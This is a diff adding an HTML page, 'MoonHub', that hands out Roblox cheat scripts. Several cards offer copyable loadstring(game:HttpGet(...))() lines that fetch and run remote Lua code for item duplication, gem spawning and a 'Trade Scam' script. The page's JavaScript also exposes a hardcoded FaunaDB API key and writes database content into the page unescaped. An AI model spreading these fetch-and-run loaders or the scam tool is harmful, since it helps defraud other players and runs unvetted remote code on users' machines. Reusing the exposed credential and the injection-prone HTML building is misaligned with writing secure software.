@@ -1,0 +1,176 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Dashboard - Scripts</title>
+    <!-- Bootstrap CSS -->
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
+    <style>
+        body {
+            background-color: #f8f9fa;
+            padding-top: 50px;
+        }
+
+        .container {
+            max-width: 900px;
+        }
+
+        .card {
+            margin-bottom: 20px;
+            background-color: #fff;
+            padding: 20px;
+        }
+
+        .card-header {
+            background-color: #007bff;
+            color: white;
+        }
+
+        textarea {
+            width: 100%;
+            height: 200px;
+        }
+
+        .copy-btn {
+            margin-top: 10px;
+        }
+
+        .tab-content {
+            margin-top: 20px;
+        }
+
+        .tab-content p {
+            font-size: 18px;
+        }
+
+        .nav-link.active {
+            background-color: #007bff;
+            color: white;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <!-- Navigation Tabs -->
+        <ul class="nav nav-tabs" id="myTab" role="tablist">
+            <li class="nav-item" role="presentation">
+                <a class="nav-link active" id="home-tab" data-bs-toggle="tab" href="#home" role="tab" aria-controls="home" aria-selected="true">Home</a>
+            </li>
+            <li class="nav-item" role="presentation">
+                <a class="nav-link" id="scripts-tab" data-bs-toggle="tab" href="#scripts" role="tab" aria-controls="scripts" aria-selected="false">Scripts</a>
+            </li>
+        </ul>
+
+        <div class="tab-content" id="myTabContent">
+            <!-- Home Tab Content -->
+            <div class="tab-pane fade show active" id="home" role="tabpanel" aria-labelledby="home-tab">
+                <h3>Welcome to MoonHub</h3>
+                <p>To proceed, please go to the "Scripts" tab.</p>
+            </div>
+
+            <!-- Scripts Tab Content -->
+            <div class="tab-pane fade" id="scripts" role="tabpanel" aria-labelledby="scripts-tab">
+                <h1>Available Scripts</h1>
+
+                <!-- Predefined Scripts Section -->
+                <div class="card">
+                    <div class="card-header">Huge Hunt Script</div>
+                    <div class="card-body">
+                        <textarea readonly>loadstring(game:HttpGet("https://raw.githubusercontent.com/AzureScript3/XD/main/huge.lua",true))()</textarea>
+                        <button class="btn btn-success copy-btn" onclick="copyToClipboard('loadstring(game:HttpGet(\"https://raw.githubusercontent.com/AzureScript3/XD/main/huge.lua\",true))()')">Copy Code</button>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <div class="card-header">Dupe Script</div>
+                    <div class="card-body">
+                        <textarea readonly>loadstring(game:HttpGet("https://raw.githubusercontent.com/AzureScript3/XD/main/Dupe.lua",true))()</textarea>
+                        <button class="btn btn-success copy-btn" onclick="copyToClipboard('loadstring(game:HttpGet(\"https://raw.githubusercontent.com/AzureScript3/XD/main/Dupe.lua\",true))()')">Copy Code</button>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <div class="card-header">Gemspawner Script</div>
+                    <div class="card-body">
+                        <textarea readonly>loadstring(game:HttpGet("https://raw.githubusercontent.com/AzureScript3/XD/main/gem.lua",true))()</textarea>
+                        <button class="btn btn-success copy-btn" onclick="copyToClipboard('loadstring(game:HttpGet(\"https://raw.githubusercontent.com/AzureScript3/XD/main/gem.lua\",true))()')">Copy Code</button>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <div class="card-header">Trade Scam Script</div>
+                    <div class="card-body">
+                        <textarea readonly>loadstring(game:HttpGet("https://raw.githubusercontent.com/AzureScript3/XD/main/trd.lua",true))()</textarea>
+                        <button class="btn btn-success copy-btn" onclick="copyToClipboard('loadstring(game:HttpGet(\"https://raw.githubusercontent.com/AzureScript3/XD/main/trd.lua\",true))()')">Copy Code</button>
+                    </div>
+                </div>
+
+                <!-- Container for Dynamically Added Scripts -->
+                <div id="scripts-container"></div>
+            </div>
+        </div>
+
+    </div>
+
+    <!-- Bootstrap JS and dependencies -->
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"></script>
+
+    <script>
+        // Copy script URL to clipboard
+        function copyToClipboard(scriptText) {
+            navigator.clipboard.writeText(scriptText).then(function() {
+                alert("Script copied to clipboard!");
+            });
+        }
+
+        // FaunaDB credentials
+        const apiKey = "fnAFtXIQiyAAQb9NFSxE45uQvttNAYpnf52kX59p";
+        const faunaUrl = 'https://db.fauna.com/v2/collections/scripts';
+
+        // Fetch and display scripts from FaunaDB
+        async function fetchScripts() {
+            try {
+                const response = await fetch(faunaUrl, {
+                    method: 'GET',
+                    headers: {
+                        'Authorization': `Bearer ${apiKey}`,
+                        'Content-Type': 'application/json'
+                    }
+                });
+
+                const data = await response.json();
+                if (data.data) {
+                    const scriptsContainer = document.getElementById('scripts-container');
+                    scriptsContainer.innerHTML = '';
+
+                    data.data.forEach(script => {
+                        const scriptCard = document.createElement('div');
+                        scriptCard.classList.add('card');
+
+                        scriptCard.innerHTML = `
+                            <div class="card-header">${script.name}</div>
+                            <div class="card-body">
+                                <textarea readonly>${script.url}</textarea>
+                                <button class="btn btn-success copy-btn" onclick="copyToClipboard('${script.url}')">Copy Code</button>
+                            </div>
+                        `;
+                        scriptsContainer.appendChild(scriptCard);
+                    });
+                } else {
+                    alert('No scripts found.');
+                }
+            } catch (error) {
+                console.error('Error fetching scripts:', error);
+                alert('Error fetching scripts from FaunaDB.');
+            }
+        }
+
+        // Call the fetchScripts function when the page loads
+        window.onload = fetchScripts;
+
+    </script>
+
+</body>
+</html>
